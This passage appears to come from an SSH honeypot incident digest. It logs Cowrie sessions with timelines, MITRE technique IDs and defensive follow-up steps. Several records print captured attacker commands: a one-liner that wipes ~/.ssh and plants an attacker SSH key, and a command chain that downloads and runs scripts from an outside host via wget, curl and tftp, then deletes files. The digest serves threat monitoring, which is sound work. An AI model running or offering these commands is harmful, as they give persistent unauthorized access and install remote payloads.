| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 07:14:25` | `cowrie.session.connect` |
| `2026-09-24 07:14:25` | `cowrie.client.version` |
| `2026-09-24 07:14:26` | `cowrie.client.kex` |
| `2026-09-24 07:14:26` | `cowrie.login.success` |
| `2026-09-24 07:14:27` | `cowrie.session.params` |
| `2026-09-24 07:14:27` | `cowrie.command.input` |
| `2026-09-24 07:14:27` | `cowrie.command.failed` |
| `2026-09-24 07:14:28` | `cowrie.log.closed` |
| `2026-09-24 07:14:29` | `cowrie.session.params` |
| `2026-09-24 07:14:29` | `cowrie.command.input` |
| `2026-09-24 07:14:29` | `cowrie.session.file_download` |
| `2026-09-24 07:14:29` | `cowrie.log.closed` |
| `2026-09-24 07:14:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.198.62[.]180` to AbuseIPDB if not already reported
- [ ] Block `175.198.62[.]180` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4bdad45c33d

| Field | Detail |
|---|---|
| **Source IP** | `175.198.62[.]180` |
| **First Seen** | 2026-09-24 07:14 |
| **Last Seen** | 2026-09-24 07:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 07:14:29` | `cowrie.session.connect` |
| `2026-09-24 07:14:29` | `cowrie.client.version` |
| `2026-09-24 07:14:29` | `cowrie.client.kex` |
| `2026-09-24 07:14:30` | `cowrie.login.success` |
| `2026-09-24 07:14:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.198.62[.]180` to AbuseIPDB if not already reported
- [ ] Block `175.198.62[.]180` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac2003c21624

| Field | Detail |
|---|---|
| **Source IP** | `175.198.62[.]180` |
| **First Seen** | 2026-09-24 07:14 |
| **Last Seen** | 2026-09-24 07:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 07:14:30` | `cowrie.session.connect` |
| `2026-09-24 07:14:30` | `cowrie.client.version` |
| `2026-09-24 07:14:31` | `cowrie.client.kex` |
| `2026-09-24 07:14:31` | `cowrie.login.success` |
| `2026-09-24 07:14:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.198.62[.]180` to AbuseIPDB if not already reported
- [ ] Block `175.198.62[.]180` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-499b658f6d69

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]74` |
| **First Seen** | 2026-09-24 07:17 |
| **Last Seen** | 2026-09-24 07:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 07:17:15` | `cowrie.session.connect` |
| `2026-09-24 07:17:15` | `cowrie.client.version` |
| `2026-09-24 07:17:15` | `cowrie.client.kex` |
| `2026-09-24 07:17:15` | `cowrie.login.success` |
| `2026-09-24 07:17:16` | `cowrie.session.params` |
| `2026-09-24 07:17:16` | `cowrie.command.input` |
| `2026-09-24 07:17:16` | `cowrie.command.failed` |
| `2026-09-24 07:17:16` | `cowrie.log.closed` |
| `2026-09-24 07:17:17` | `cowrie.session.params` |
| `2026-09-24 07:17:17` | `cowrie.command.input` |
| `2026-09-24 07:17:17` | `cowrie.session.file_download` |
| `2026-09-24 07:17:17` | `cowrie.log.closed` |
| `2026-09-24 07:17:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]74` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]74` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ccba301add1b

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]74` |
| **First Seen** | 2026-09-24 07:17 |
| **Last Seen** | 2026-09-24 07:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 07:17:17` | `cowrie.session.connect` |
| `2026-09-24 07:17:17` | `cowrie.client.version` |
| `2026-09-24 07:17:17` | `cowrie.client.kex` |
| `2026-09-24 07:17:18` | `cowrie.login.success` |
| `2026-09-24 07:17:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]74` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]74` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69b6f7f6f4c3

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]74` |
| **First Seen** | 2026-09-24 07:17 |
| **Last Seen** | 2026-09-24 07:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 07:17:18` | `cowrie.session.connect` |
| `2026-09-24 07:17:18` | `cowrie.client.version` |
| `2026-09-24 07:17:18` | `cowrie.client.kex` |
| `2026-09-24 07:17:18` | `cowrie.login.success` |
| `2026-09-24 07:17:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]74` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]74` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc9025d24994

| Field | Detail |
|---|---|
| **Source IP** | `219.250.188[.]143` |
| **First Seen** | 2026-09-24 07:20 |
| **Last Seen** | 2026-09-24 07:20 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 07:20:47` | `cowrie.session.connect` |
| `2026-09-24 07:20:47` | `cowrie.client.version` |
| `2026-09-24 07:20:47` | `cowrie.client.kex` |
| `2026-09-24 07:20:48` | `cowrie.login.success` |
| `2026-09-24 07:20:49` | `cowrie.session.params` |
| `2026-09-24 07:20:49` | `cowrie.command.input` |
| `2026-09-24 07:20:49` | `cowrie.command.failed` |
| `2026-09-24 07:20:49` | `cowrie.log.closed` |
| `2026-09-24 07:20:50` | `cowrie.session.params` |
| `2026-09-24 07:20:50` | `cowrie.command.input` |
| `2026-09-24 07:20:50` | `cowrie.session.file_download` |
| `2026-09-24 07:20:50` | `cowrie.log.closed` |
| `2026-09-24 07:20:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `219.250.188[.]143` to AbuseIPDB if not already reported
- [ ] Block `219.250.188[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ca3c4849eee

| Field | Detail |
|---|---|
| **Source IP** | `219.250.188[.]143` |
| **First Seen** | 2026-09-24 07:20 |
| **Last Seen** | 2026-09-24 07:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 07:20:51` | `cowrie.session.connect` |
| `2026-09-24 07:20:51` | `cowrie.client.version` |
| `2026-09-24 07:20:51` | `cowrie.client.kex` |
| `2026-09-24 07:20:52` | `cowrie.login.success` |
| `2026-09-24 07:20:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `219.250.188[.]143` to AbuseIPDB if not already reported
- [ ] Block `219.250.188[.]143` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1815228c5aa6

| Field | Detail |
|---|---|
| **Source IP** | `219.250.188[.]143` |
| **First Seen** | 2026-09-24 07:20 |
| **Last Seen** | 2026-09-24 07:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 07:20:52` | `cowrie.session.connect` |
| `2026-09-24 07:20:52` | `cowrie.client.version` |
| `2026-09-24 07:20:52` | `cowrie.client.kex` |
| `2026-09-24 07:20:53` | `cowrie.login.success` |
| `2026-09-24 07:20:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `219.250.188[.]143` to AbuseIPDB if not already reported
- [ ] Block `219.250.188[.]143` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a4227d62246

| Field | Detail |
|---|---|
| **Source IP** | `197.199.224[.]52` |
| **First Seen** | 2026-09-24 07:23 |
| **Last Seen** | 2026-09-24 07:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 07:23:49` | `cowrie.session.connect` |
| `2026-09-24 07:23:49` | `cowrie.client.version` |
| `2026-09-24 07:23:49` | `cowrie.client.kex` |
| `2026-09-24 07:23:49` | `cowrie.login.success` |
| `2026-09-24 07:23:50` | `cowrie.session.params` |
| `2026-09-24 07:23:50` | `cowrie.command.input` |
| `2026-09-24 07:23:50` | `cowrie.command.failed` |
| `2026-09-24 07:23:50` | `cowrie.log.closed` |
| `2026-09-24 07:23:51` | `cowrie.session.params` |
| `2026-09-24 07:23:51` | `cowrie.command.input` |
| `2026-09-24 07:23:51` | `cowrie.session.file_download` |
| `2026-09-24 07:23:51` | `cowrie.log.closed` |
| `2026-09-24 07:23:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.199.224[.]52` to AbuseIPDB if not already reported
- [ ] Block `197.199.224[.]52` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c58d332a1f4e

| Field | Detail |
|---|---|
| **Source IP** | `197.199.224[.]52` |
| **First Seen** | 2026-09-24 07:23 |
| **Last Seen** | 2026-09-24 07:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 07:23:51` | `cowrie.session.connect` |
| `2026-09-24 07:23:51` | `cowrie.client.version` |
| `2026-09-24 07:23:51` | `cowrie.client.kex` |
| `2026-09-24 07:23:52` | `cowrie.login.success` |
| `2026-09-24 07:23:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.199.224[.]52` to AbuseIPDB if not already reported
- [ ] Block `197.199.224[.]52` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f035e21d461f

| Field | Detail |
|---|---|
| **Source IP** | `197.199.224[.]52` |
| **First Seen** | 2026-09-24 07:23 |
| **Last Seen** | 2026-09-24 07:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 07:23:52` | `cowrie.session.connect` |
| `2026-09-24 07:23:52` | `cowrie.client.version` |
| `2026-09-24 07:23:52` | `cowrie.client.kex` |
| `2026-09-24 07:23:53` | `cowrie.login.success` |
| `2026-09-24 07:23:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.199.224[.]52` to AbuseIPDB if not already reported
- [ ] Block `197.199.224[.]52` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d076d909a99c

| Field | Detail |
|---|---|
| **Source IP** | `124.174.15[.]24` |
| **First Seen** | 2026-09-24 07:26 |
| **Last Seen** | 2026-09-24 07:26 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 07:26:02` | `cowrie.session.connect` |
| `2026-09-24 07:26:02` | `cowrie.client.version` |
| `2026-09-24 07:26:02` | `cowrie.client.kex` |
| `2026-09-24 07:26:03` | `cowrie.login.success` |
| `2026-09-24 07:26:04` | `cowrie.session.params` |
| `2026-09-24 07:26:04` | `cowrie.command.input` |
| `2026-09-24 07:26:04` | `cowrie.command.failed` |
| `2026-09-24 07:26:04` | `cowrie.log.closed` |
| `2026-09-24 07:26:05` | `cowrie.session.params` |
| `2026-09-24 07:26:05` | `cowrie.command.input` |
| `2026-09-24 07:26:05` | `cowrie.session.file_download` |
| `2026-09-24 07:26:05` | `cowrie.log.closed` |
| `2026-09-24 07:26:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.174.15[.]24` to AbuseIPDB if not already reported
- [ ] Block `124.174.15[.]24` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21522a33ccdb

| Field | Detail |
|---|---|
| **Source IP** | `124.174.15[.]24` |
| **First Seen** | 2026-09-24 07:26 |
| **Last Seen** | 2026-09-24 07:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 07:26:06` | `cowrie.session.connect` |
| `2026-09-24 07:26:06` | `cowrie.client.version` |
| `2026-09-24 07:26:06` | `cowrie.client.kex` |
| `2026-09-24 07:26:08` | `cowrie.login.success` |
| `2026-09-24 07:26:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.174.15[.]24` to AbuseIPDB if not already reported
- [ ] Block `124.174.15[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d98bbc732c57

| Field | Detail |
|---|---|
| **Source IP** | `115.190.213[.]206` |
| **First Seen** | 2026-09-24 07:26 |
| **Last Seen** | 2026-09-24 07:27 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 07:26:53` | `cowrie.session.connect` |
| `2026-09-24 07:26:53` | `cowrie.client.version` |
| `2026-09-24 07:26:53` | `cowrie.client.kex` |
| `2026-09-24 07:26:57` | `cowrie.login.success` |
| `2026-09-24 07:26:58` | `cowrie.session.params` |
| `2026-09-24 07:26:58` | `cowrie.command.input` |
| `2026-09-24 07:26:58` | `cowrie.command.failed` |
| `2026-09-24 07:26:59` | `cowrie.log.closed` |
| `2026-09-24 07:27:00` | `cowrie.session.params` |
| `2026-09-24 07:27:00` | `cowrie.command.input` |
| `2026-09-24 07:27:01` | `cowrie.session.file_download` |
| `2026-09-24 07:27:01` | `cowrie.log.closed` |
| `2026-09-24 07:27:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.213[.]206` to AbuseIPDB if not already reported
- [ ] Block `115.190.213[.]206` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e69c72c67540

| Field | Detail |
|---|---|
| **Source IP** | `115.190.213[.]206` |
| **First Seen** | 2026-09-24 07:27 |
| **Last Seen** | 2026-09-24 07:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 07:27:00` | `cowrie.session.connect` |
| `2026-09-24 07:27:00` | `cowrie.client.version` |
| `2026-09-24 07:27:01` | `cowrie.client.kex` |
| `2026-09-24 07:27:02` | `cowrie.login.success` |
| `2026-09-24 07:27:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.213[.]206` to AbuseIPDB if not already reported
- [ ] Block `115.190.213[.]206` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd0cce181624

| Field | Detail |
|---|---|
| **Source IP** | `23.94.206[.]233` |
| **First Seen** | 2026-09-24 07:35 |
| **Last Seen** | 2026-09-24 07:35 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp || cd /run || cd /mnt || cd /root || cd /; wget hxxp://213.232.114[.]14/nokillbins/handshakebins.sh; busybox wget hxxp://213.232.114[.]14/nokillbins/handshakebins.sh; curl -o handshakebins.sh hxxp://213.232.114[.]14/nokillbins/handshakebins.sh; chmod 777 handshakebins.sh; sh handshakebins.sh; tftp 213.232.114[.]14 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 213.232.114[.]14; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf handshakebins.sh tftp1.sh tftp2.sh; rm -rf *` |
| **Download Attempts** | hxxp://213.232.114[.]14/nokillbins/handshakebins.sh, hxxp://213.232.114[.]14/nokillbins/handshakebins.sh, hxxp://213.232.114[.]14/nokillbins/handshakebins.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 07:35:39` | `cowrie.session.connect` |
| `2026-09-24 07:35:39` | `cowrie.login.success` |
| `2026-09-24 07:35:40` | `cowrie.session.params` |
| `2026-09-24 07:35:41` | `cowrie.command.input` |
| `2026-09-24 07:35:41` | `cowrie.command.input` |
| `2026-09-24 07:35:42` | `cowrie.session.file_download` |
| `2026-09-24 07:35:42` | `cowrie.session.file_download` |
| `2026-09-24 07:35:42` | `cowrie.session.file_download` |
| `2026-09-24 07:35:42` | `cowrie.session.file_download` |
| `2026-09-24 07:35:42` | `cowrie.session.file_download.failed` |
| `2026-09-24 07:35:42` | `cowrie.session.file_download` |
| `2026-09-24 07:35:42` | `cowrie.session.file_download` |
| `2026-09-24 07:35:56` | `cowrie.log.closed` |
| `2026-09-24 07:35:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.94.206[.]233` to AbuseIPDB if not already reported
- [ ] Block `23.94.206[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4256f0d42dc2

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-24 07:40 |
| **Last Seen** | 2026-09-24 07:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 07:40:43` | `cowrie.session.connect` |
| `2026-09-24 07:40:43` | `cowrie.client.version` |
| `2026-09-24 07:40:43` | `cowrie.client.kex` |
| `2026-09-24 07:40:43` | `cowrie.login.success` |
| `2026-09-24 07:40:44` | `cowrie.direct-tcpip.request` |
| `2026-09-24 07:40:44` | `cowrie.direct-tcpip.data` |
| `2026-09-24 07:40:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-423ab4b9e5ec

| Field | Detail |
|---|---|
| **Source IP** | `195.58.38[.]201` |
| **First Seen** | 2026-09-24 07:42 |
| **Last Seen** | 2026-09-24 07:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 07:42:18` | `cowrie.session.connect` |
| `2026-09-24 07:42:18` | `cowrie.client.version` |
| `2026-09-24 07:42:18` | `cowrie.client.kex` |
| `2026-09-24 07:42:19` | `cowrie.login.success` |
| `2026-09-24 07:42:20` | `cowrie.session.params` |
| `2026-09-24 07:42:20` | `cowrie.command.input` |
| `2026-09-24 07:42:20` | `cowrie.command.failed` |
| `2026-09-24 07:42:20` | `cowrie.log.closed` |
| `2026-09-24 07:42:21` | `cowrie.session.params` |
| `2026-09-24 07:42:21` | `cowrie.command.input` |
| `2026-09-24 07:42:21` | `cowrie.session.file_download` |
| `2026-09-24 07:42:21` | `cowrie.log.closed` |
| `2026-09-24 07:42:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.58.38[.]201` to AbuseIPDB if not already reported
- [ ] Block `195.58.38[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9c197e6f927

| Field | Detail |
|---|---|
| **Source IP** | `195.58.38[.]201` |
| **First Seen** | 2026-09-24 07:42 |
| **Last Seen** | 2026-09-24 07:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 07:42:21` | `cowrie.session.connect` |
| `2026-09-24 07:42:21` | `cowrie.client.version` |
